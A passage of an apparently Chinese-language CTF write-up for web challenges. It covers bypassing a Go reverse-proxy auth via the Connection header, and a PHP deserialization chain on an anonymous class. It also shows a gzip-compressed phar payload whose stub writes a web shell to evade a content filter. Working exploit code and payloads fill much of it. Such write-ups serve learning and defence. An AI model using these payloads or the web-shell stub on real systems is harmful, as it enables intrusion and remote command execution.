class="string">&quot;GET&quot;</span>)</span><br><span class="line"></span><br><span class="line">	log.Println(<span class="string">&quot;Sign service is running at 127.0.0.1:4444&quot;</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err := http.ListenAndServe(<span class="string">&quot;127.0.0.1:4444&quot;</span>, signRouter); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	log.Println(<span class="string">&quot;Authorizer middleware service is running at :5555&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err := http.ListenAndServe(<span class="string">&quot;:5555&quot;</span>, authorizer); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现程序初始化的时候会把flag放到admin用户的信息里，并且只要以admin身份登录后就可以在&#x2F;dashboard看到flag。我们重点关注登录的鉴权逻辑，如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">view_func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">view_func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapped</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        uid = request.headers.get(<span class="string">&#x27;X-User&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(uid)</span><br><span class="line">        <span class="keyword">if</span> uid == <span class="string">&#x27;anonymous&#x27;</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Please sign in first.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            uid_int = <span class="built_in">int</span>(uid)</span><br><span class="line">        <span class="keyword">except</span> (TypeError, ValueError):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid session. Please sign in again.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        user = User.query.filter_by(<span class="built_in">id</span>=uid_int).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">            flash(<span class="string">&#x27;User not found. Please sign in again.&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        g.current_user = user</span><br><span class="line">        <span class="keyword">return</span> view_func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapped</span><br></pre></td></tr></table></figure>

<p>可以发现Flask每次请求时，都会从HTTP请求头中取出X-User，如果没有就默认是0，正好前面可以看到admin用户的uid就是0，但是没有那么简单，因为从main.go里面可以看到5555端口是有一个Authorizer middleware，而从docker-compose.yml里可以看出docker内部实际转发出的端口就是5555，因此我们的请求是首先到5555端口，然后才被转发到5000端口的python服务。因此只要我们能保证在请求到达python服务时请求头里面没有X-User即可。</p>
<p>接下来看看main.go里面是怎么处理的</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    authorizer := &amp;httputil.ReverseProxy&#123;Director: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request)</span></span> &#123;</span><br><span class="line">        req.URL.Scheme = <span class="string">&quot;http&quot;</span></span><br><span class="line">        req.URL.Host = <span class="string">&quot;127.0.0.1:5000&quot;</span></span><br><span class="line"></span><br><span class="line">        uid := GetUIDFromRequest(req)</span><br><span class="line">        log.Printf(<span class="string">&quot;Request UID: %s, URL: %s&quot;</span>, uid, req.URL.String())</span><br><span class="line">        req.Header.Del(<span class="string">&quot;Authorization&quot;</span>)</span><br><span class="line">        req.Header.Del(<span class="string">&quot;X-User&quot;</span>)</span><br><span class="line">        req.Header.Del(<span class="string">&quot;X-Forwarded-For&quot;</span>)</span><br><span class="line">        req.Header.Del(<span class="string">&quot;Cookie&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">            req.Header.Set(<span class="string">&quot;X-User&quot;</span>, <span class="string">&quot;anonymous&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            req.Header.Set(<span class="string">&quot;X-User&quot;</span>, uid)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到如果uid为空，会设置X-User为anonymous，否则设为uid，因为我们不知道admin用户的密码并且无法伪造jwt，所以这样一来怎么都不可能让X-User为0</p>
<p>这里最终的解决办法是用到了一个trick，在Connection头中写入HTTP请求头，代理就不会转发这个请求头，这样就可以实现X-User无赋值，从而让X-User默认为0。<br>Connection头是只对当前连接有效的选项（connection-specific options）。意味着它不能被代理（proxy）转发到后续的连接中。具体可参考<a target="_blank" rel="noopener" href="https://github.com/golang/go/issues/50580">https://github.com/golang/go/issues/50580</a></p>
<p>使用hackbar可以轻松完成<br><img src="/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/2.png" alt="alt text"></p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZnVuY3Rpb24gZ2VuZXJhdGVSYW5kb21TdHJpbmcoJGxlbmd0aCA9IDgpeyRjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JzskcmFuZG9tU3RyaW5nID0gJyc7Zm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgeyRyID0gcmFuZCgwLCBzdHJsZW4oJGNoYXJhY3RlcnMpIC0gMSk7JHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1skcl07fXJldHVybiAkcmFuZG9tU3RyaW5nO31kYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdBc2lhL1NoYW5naGFpJyk7Y2xhc3MgdGVzdHtwdWJsaWMgJHJlYWRmbGFnO3B1YmxpYyAkZjtwdWJsaWMgJGtleTtwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXskdGhpcy0+cmVhZGZsYWcgPSBuZXcgY2xhc3Mge3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpe2lmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pICYmICRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA9PSAwKSB7JHRpbWUgPSBkYXRlKCdIaScpOyRmaWxlbmFtZSA9ICRHTE9CQUxTWydmaWxlbmFtZSddOyRzZWVkID0gJHRpbWUgLiBpbnR2YWwoJGZpbGVuYW1lKTttdF9zcmFuZCgkc2VlZCk7JHVwbG9hZERpciA9ICd1cGxvYWRzLyc7JGZpbGVzID0gZ2xvYigkdXBsb2FkRGlyIC4gJyonKTtmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHtpZiAoaXNfZmlsZSgkZmlsZSkpIHVubGluaygkZmlsZSk7fSRyYW5kb21TdHIgPSBnZW5lcmF0ZVJhbmRvbVN0cmluZyg4KTskbmV3RmlsZW5hbWUgPSAkdGltZSAuICcuJyAuICRyYW5kb21TdHIgLiAnLicgLiAnanBnJzskR0xPQkFMU1snZmlsZSddID0gJG5ld0ZpbGVuYW1lOyR1cGxvYWRlZEZpbGUgPSAkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ107JHVwbG9hZFBhdGggPSAkdXBsb2FkRGlyIC4gJG5ld0ZpbGVuYW1lOyBpZiAoc3lzdGVtKCJjcCAiLiR1cGxvYWRlZEZpbGUuIiAiLiAkdXBsb2FkUGF0aCkpIHtlY2hvICJzdWNjZXNzIHVwbG9hZCEiO30gZWxzZSB7ZWNobyAiZXJyb3IiO319fXB1YmxpYyBmdW5jdGlvbiBfX3dha2V1cCgpe3BocGluZm8oKTt9cHVibGljIGZ1bmN0aW9uIHJlYWRmbGFnKCl7ZnVuY3Rpb24gcmVhZGZsYWcoKXtpZiAoaXNzZXQoJEdMT0JBTFNbJ2ZpbGUnXSkpIHskZmlsZSA9ICRHTE9CQUxTWydmaWxlJ107JGZpbGUgPSBiYXNlbmFtZSgkZmlsZSk7aWYgKHByZWdfbWF0Y2goJy86XC9cLy8nLCAkZmlsZSkpZGllKCJlcnJvciIpOyRmaWxlX2NvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygidXBsb2Fkcy8iIC4gJGZpbGUpO2lmIChwcmVnX21hdGNoKCcvPFw/fFw6XC9cL3xwaHxcP1w9L2knLCAkZmlsZV9jb250ZW50KSkge2RpZSgiSWxsZWdhbCBjb250ZW50IGRldGVjdGVkIGluIHRoZSBmaWxlLiIpO31pbmNsdWRlKCJ1cGxvYWRzLyIgLiAkZmlsZSk7fX19fTt9cHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKXskZnVuYyA9ICR0aGlzLT5mOyRHTE9CQUxTWydmaWxlbmFtZSddID0gJHRoaXMtPnJlYWRmbGFnO2lmICgkdGhpcy0+a2V5ID09ICdjbGFzcycpbmV3ICRmdW5jKCk7ZWxzZSBpZiAoJHRoaXMtPmtleSA9PSAnZnVuYycpIHskZnVuYygpO30gZWxzZSB7aGlnaGxpZ2h0X2ZpbGUoJ2luZGV4LnBocCcpO319fSRzZXIgPSBpc3NldCgkX0dFVFsnbGFuZCddKSA/ICRfR0VUWydsYW5kJ10gOiAnTzo0OiJ0ZXN0IjpOJztAdW5zZXJpYWxpemUoJHNlcik7&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$readflag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;readflag = <span class="keyword">new</span> <span class="class"><span class="keyword">class</span> </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line">                    <span class="variable">$filename</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">                    <span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);</span><br><span class="line">                    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">                    <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">                    <span class="variable">$files</span> = <span class="title function_ invoke__">glob</span>(<span class="variable">$uploadDir</span> . <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$randomStr</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line">                    <span class="variable">$newFilename</span> = <span class="variable">$time</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$randomStr</span> . <span class="string">&#x27;.&#x27;</span> . <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">                    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>] = <span class="variable">$newFilename</span>;</span><br><span class="line">                    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                    <span class="variable">$uploadPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$newFilename</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">system</span>(<span class="string">&quot;cp &quot;</span> . <span class="variable">$uploadedFile</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$uploadPath</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success upload!&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">                        <span class="variable">$file</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">                        <span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/:\/\//&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;Illegal content detected in the file.&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">include</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;f;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable language_">$this</span>-&gt;readflag;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key == <span class="string">&#x27;class&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="variable">$func</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key == <span class="string">&#x27;func&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$func</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;land&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;land&#x27;</span>] : <span class="string">&#x27;O:4:&quot;test&quot;:N&#x27;</span>;</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br></pre></td></tr></table></figure>

<p>正常走destruct看phpinfo可以发现php版本为7.4.33</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:1:&quot;f&quot;;s:7:&quot;phpinfo&quot;;s:3:&quot;key&quot;;s:4:&quot;func&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>观察源代码 我们思路就是：</p>
<ul>
<li>传个文件</li>
<li>调用到匿名类的readflag 使readflag被声明</li>
<li>直接调用readflag</li>
<li>文件包含</li>
</ul>
<p>匿名类遵循这样的规则：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00 + 函数 + 路径 : 行号$序号</span><br></pre></td></tr></table></figure>

<p>但是这里是eval里注册的，我们起一个示例看看。可以通过 <code>get_class()</code> 的方式查看匿名类的序列化情况</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$b = new class&#123;&#125;;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">get_class</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">get_class</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class@anonymousD:\phpstudy_pro\test\testtest.php(2) : eval()&#x27;d code:1$5</span><br><span class="line">class%40anonymous%00D%3A%5Cphpstudy_pro%5Ctest%5Ctesttest.php%282%29+%3A+eval%28%29%27d+code%3A1%245</span><br></pre></td></tr></table></figure>

<p>因此eval中的匿名类类名的规则是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class@anonymous + %00 + 路径 + : + (eval 的行号) + eval()&#x27;d code: + eval 中定义的行号 + $ 匿名类序号</span><br></pre></td></tr></table></figure>

<p>所以我们可以这样调用到 readflag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test1</span>-&gt;key = <span class="string">&quot;func&quot;</span>;</span><br><span class="line"><span class="variable">$test1</span>-&gt;f = [<span class="string">&quot;class@anonymous\00/var/www/html/index.php(1) : eval()&#x27;d code:1<span class="subst">$0</span>&quot;</span>, <span class="string">&#x27;readflag&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test2</span> -&gt; key = <span class="string">&quot;func&quot;</span>;</span><br><span class="line"><span class="variable">$test2</span> -&gt; f = <span class="string">&quot;readflag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = [<span class="variable">$test1</span>, <span class="variable">$test2</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br></pre></td></tr></table></figure>

<p>这里 <code>[&quot;class@anonymous\00/var/www/html/index.php(1) : eval()&#39;d code:1$0&quot;, &#39;readflag&#39;]</code>是一个 PHP 回调数组 <code>[&quot;类名字符串&quot;, &quot;方法名&quot;]</code>，等价于 <code>&quot;类名字符串&quot;::方法名();</code></p>
<p>也就是说，在 $test1 析构时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$func = $this-&gt;f;            // [&quot;class@anonymous\00...$0&quot;, &quot;readflag&quot;]</span><br><span class="line">$func();                     // 等价于  class@anonymous\00...$0::readflag();</span><br></pre></td></tr></table></figure>
<p>从而成功调用匿名类的方法 readflag()，这样方法 readflag() 内层的 <code>function readflag()&#123;...&#125;</code> 才会在全局被注册。</p>
<blockquote>
<p>在 PHP 里，“在函数&#x2F;方法里面写的 function xxx(){} 其实还是在定义一个全局函数，只是定义这件事要等执行到那一行才发生”。</p>
</blockquote>
<p>能调用readflag后，肯定要去用上这个文件包含，但是这里有不少过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;</span>, <span class="variable">$file_content</span>)</span><br></pre></td></tr></table></figure>

<p>其实这个考点前一段时间热度挺高，参考这个博客<a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/</a></p>
<p>我们可以上传一个用gzip压缩过的phar文件，最后只要文件名中有.phar，即可在被文件包含后默认把这个gz文件解压回phar进行解析。</p>
<p>我们可以这样构造 phar</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$stub</span> = <span class="string">&lt;&lt;&lt;&#x27;STUB&#x27;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    system(&#x27;echo &quot;&lt;?php system(\$_GET[1]); ?&gt;&quot; &gt; 1.php&#x27;);</span></span><br><span class="line"><span class="string">    __HALT_COMPILER();</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">STUB</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$stub</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>随后gzip压缩一下就可以，不过由于gzip压缩后文件名exploit.phar会留在文件的字符串里，还是会被waf检测到有ph，解决方法是用010editor直接把ph里面的一个字母改成别的字母就好了</p>
<p>那么最后的问题是如何构造这样的文件名，看一下文件名怎么生成的</p>
